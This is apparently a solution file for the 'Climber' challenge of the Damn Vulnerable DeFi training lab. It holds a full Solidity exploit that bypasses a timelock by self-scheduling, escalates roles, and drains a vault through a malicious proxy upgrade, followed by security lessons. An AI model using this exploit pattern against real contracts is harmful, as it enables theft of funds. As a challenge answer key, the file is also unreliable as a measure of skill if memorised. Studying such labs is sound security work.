// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

/**
 * ╔══════════════════════════════════════════════════════════════════════════════════════╗
 * ║                            🧗 CLIMBER EXPLOIT EXPLAINED 🧗                            ║
 * ╠══════════════════════════════════════════════════════════════════════════════════════╣
 * ║                                                                                      ║
 * ║ VULNERABILITY: Execute-Before-Check in ClimberTimelock.execute()                    ║
 * ║                                                                                      ║
 * ║ The ClimberTimelock contract has a critical flaw in its execute() function:         ║
 * ║                                                                                      ║
 * ║   function execute(...) external payable {                                          ║
 * ║       // ... validation ...                                                         ║
 * ║       for (uint8 i = 0; i < targets.length; ++i) {                                 ║
 * ║           targets[i].functionCallWithValue(dataElements[i], values[i]); // ← EXEC   ║
 * ║       }                                                                             ║
 * ║       if (getOperationState(id) != OperationState.ReadyForExecution) { // ← CHECK  ║
 * ║           revert NotReadyForExecution(id);                                          ║
 * ║       }                                                                             ║
 * ║   }                                                                                 ║
 * ║                                                                                      ║
 * ║ EXPLOIT STRATEGY: Self-Scheduling Attack                                            ║
 * ║                                                                                      ║
 * ║ 1. Call execute() with operations that haven't been scheduled                      ║
 * ║ 2. Operations execute BEFORE the scheduling check                                   ║
 * ║ 3. One operation schedules itself retroactively                                     ║
 * ║ 4. When check runs, operation appears "properly scheduled"                          ║
 * ║                                                                                      ║
 * ╚══════════════════════════════════════════════════════════════════════════════════════╝
 */

/**
 * @title HackClimberVault
 * @notice Malicious vault implementation that drains all tokens
 * @dev This contract replaces the original vault via upgradeToAndCall
 */
contract HackClimberVault is ClimberVault {
    /**
     * @notice Drains all tokens from the vault to the recovery address
     * @param token The ERC20 token to drain
     * @param recovery The destination address for drained tokens
     */
    function executeAttack(DamnValuableToken token, address recovery) public {
        token.transfer(recovery, token.balanceOf(address(this)));
    }
}

/**
 * @title Attacker Contract
 * @notice Orchestrates the Climber exploit using a self-scheduling attack
 * @dev Exploits the execute-before-check vulnerability in ClimberTimelock
 *
 * ATTACK PHASES:
 *
 * Phase 1 (Initial Exploit):
 *   Operation 0: timelock.updateDelay(0) - Remove execution delay
 *   Operation 1: timelock.grantRole(PROPOSER_ROLE, attacker) - Gain proposer privileges
 *   Operation 2: attacker.scheduleAttack() - Schedule this operation retroactively
 *
 * Phase 2 (Vault Drainage):
 *   - Use newly gained PROPOSER_ROLE to upgrade vault
 *   - Replace vault implementation with malicious HackClimberVault
 *   - Drain all tokens to recovery address
 */
contract Attacker {
    // Unique salt for operation identification
    bytes32 salt = keccak256(abi.encode("salt"));

    // Target contracts
    ClimberTimelock timelock;
    ClimberVault vault;
    DamnValuableToken token;
    address recovery;

    constructor(
        ClimberTimelock _timelock,
        ClimberVault _vault,
        DamnValuableToken _token,
        address _recovery
    ) {
        timelock = _timelock;
        vault = _vault;
        token = _token;
        recovery = _recovery;
    }

    /**
     * @notice Retroactively schedules the exploit operation
     * @dev This function is called as the 3rd operation during the exploit
     *      It schedules the exact same operation that is currently being executed
     *      When the timelock checks if the operation was scheduled, it will find this entry
     */
    function scheduleAttack() public {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements, // salt is returned but not used here since it's already a member variable

        ) = prepareScheduleAttackData();

        // Schedule the operation that's currently being executed
        // This creates the "ReadyForExecution" state needed to pass the final check
        timelock.schedule(targets, values, dataElements, salt);
    }

    /**
     * @notice Executes Phase 2 of the attack: vault upgrade and token drainage
     * @dev This function is called after gaining PROPOSER_ROLE and setting delay to 0
     *      It uses the legitimate timelock functionality to upgrade the vault
     */
    function executeAttack() public {
        // Prepare the call data for the malicious vault's executeAttack function
        bytes memory hackData = abi.encodeWithSelector(
            HackClimberVault.executeAttack.selector,
            token,
            recovery
        );

        // Set up the vault upgrade operation
        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        bytes[] memory dataElements = new bytes[](1);

        targets[0] = address(vault);
        values[0] = 0;
        // upgradeToAndCall will:
        // 1. Upgrade vault implementation to HackClimberVault
        // 2. Immediately call executeAttack() on the new implementation
        dataElements[0] = abi.encodeWithSelector(
            vault.upgradeToAndCall.selector,
            address(new HackClimberVault()),
            hackData
        );

        // Since delay is now 0, we can schedule and immediately execute
        timelock.schedule(targets, values, dataElements, salt);
        timelock.execute(targets, values, dataElements, salt);
    }

    /**
     * @notice Prepares the exploit operation data
     * @dev This function constructs the exact operation that will be executed
     *      It's called both during the exploit and when scheduling retroactively
     * @return targets Array of contract addresses to call
     * @return values Array of ETH values to send (all zeros)
     * @return dataElements Array of encoded function calls
     * @return salt The operation identifier salt
     */
    function prepareScheduleAttackData()
        public
        view
        returns (address[] memory, uint256[] memory, bytes[] memory, bytes32)
    {
        address[] memory targets = new address[](3);
        uint256[] memory values = new uint256[](3);
        bytes[] memory dataElements = new bytes[](3);

        // Operation 0: Timelock calls itself to remove the execution delay
        // This allows immediate execution of future operations
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(
            timelock.updateDelay.selector,
            0 // Set delay to 0
        );

        // Operation 1: Timelock calls itself to grant PROPOSER_ROLE to this attacker
        // This gives us permission to schedule future operations
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(
            timelock.grantRole.selector,
            PROPOSER_ROLE,
            address(this) // Grant role to this attacker contract
        );

        // Operation 2: This attacker calls its own scheduleAttack function
        // This retroactively schedules the current operation, making it "legitimate"
        targets[2] = address(this);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSelector(this.scheduleAttack.selector);

        return (targets, values, dataElements, salt);
    }
}

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(
                        ClimberVault.initialize,
                        (deployer, proposer, sweeper)
                    ) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * @notice Climber Exploit Test - Demonstrates the Execute-Before-Check Vulnerability
     * @dev This test showcases one of the most elegant smart contract exploits
     *
     * 🎯 ATTACK SUMMARY:
     * ─────────────────────────────────────────────────────────────────────────────────
     * 1. Call timelock.execute() with unscheduled operations
     * 2. Operations execute immediately (before scheduling check)
     * 3. One operation retroactively schedules itself
     * 4. Scheduling check passes, exploit succeeds
     * 5. Use gained privileges to drain vault
     *
     * 🔍 DETAILED ATTACK FLOW:
     * ─────────────────────────────────────────────────────────────────────────────────
     * Phase 1 - Initial Privilege Escalation:
     *   → timelock.execute([unscheduled operation]) called
     *   → Operation 0: timelock.updateDelay(0) executes
     *     ✓ Delay is now 0 (allows immediate future executions)
     *   → Operation 1: timelock.grantRole(PROPOSER_ROLE, attacker) executes
     *     ✓ Attacker now has PROPOSER_ROLE
     *   → Operation 2: attacker.scheduleAttack() executes
     *     ✓ This operation is now retroactively scheduled
     *   → timelock checks if operation was scheduled
     *     ✓ Check passes! Operation appears legitimate
     *
     * Phase 2 - Vault Drainage:
     *   → attacker.executeAttack() called
     *   → Uses PROPOSER_ROLE to schedule vault upgrade
     *   → Executes immediately (delay = 0)
     *   → Vault upgraded to malicious implementation
     *   → All tokens drained to recovery address
     *
     * 💡 KEY INSIGHT:
     * The vulnerability exists because execute() performs operations BEFORE
     * checking if they were properly scheduled, allowing self-scheduling attacks.
     */
    function test_climber() public checkSolvedByPlayer {
        // Deploy the attacker contract
        Attacker attacker = new Attacker(timelock, vault, token, recovery);

        // Get the exploit operation data
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements,
            bytes32 salt
        ) = attacker.prepareScheduleAttackData();

        // 🚨 THE EXPLOIT: Execute unscheduled operations
        // This will execute all operations BEFORE checking if they were scheduled
        // One of the operations will retroactively schedule this exact operation
        timelock.execute(targets, values, dataElements, salt);

        // 💰 DRAIN THE VAULT: Use newly gained privileges
        // Now that we have PROPOSER_ROLE and delay is 0, drain the vault
        attacker.executeAttack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(
            token.balanceOf(recovery),
            VAULT_TOKEN_BALANCE,
            "Not enough tokens in recovery account"
        );
    }
}

/**
 * ╔══════════════════════════════════════════════════════════════════════════════════════╗
 * ║                           🛡️ SECURITY LESSONS LEARNED 🛡️                            ║
 * ╠══════════════════════════════════════════════════════════════════════════════════════╣
 * ║                                                                                      ║
 * ║ 1. CHECKS-EFFECTS-INTERACTIONS PATTERN                                              ║
 * ║    Always perform checks BEFORE executing external calls                            ║
 * ║    The timelock should verify scheduling BEFORE executing operations               ║
 * ║                                                                                      ║
 * ║ 2. REENTRANCY CONSIDERATIONS                                                        ║
 * ║    External calls can manipulate state during execution                             ║
 * ║    Use reentrancy guards for functions that make external calls                     ║
 * ║                                                                                      ║
 * ║ 3. TIMELOCK DESIGN PRINCIPLES                                                       ║
 * ║    - Validate operations before execution                                           ║
 * ║    - Use proper access controls                                                     ║
 * ║    - Implement emergency pause mechanisms                                           ║
 * ║    - Consider using OpenZeppelin's TimelockController                              ║
 * ║                                                                                      ║
 * ║ 4. UPGRADE PATTERN SECURITY                                                         ║
 * ║    - Restrict upgrade permissions carefully                                         ║
 * ║    - Use multi-sig for critical upgrades                                           ║
 * ║    - Consider immutable contracts for critical components                           ║
 * ║                                                                                      ║
 * ║ 💡 This exploit demonstrates why the order of operations matters in smart          ║
 * ║    contract security. A simple reordering of checks could have prevented this.     ║
 * ║                                                                                      ║
 * ╚══════════════════════════════════════════════════════════════════════════════════════╝
 */
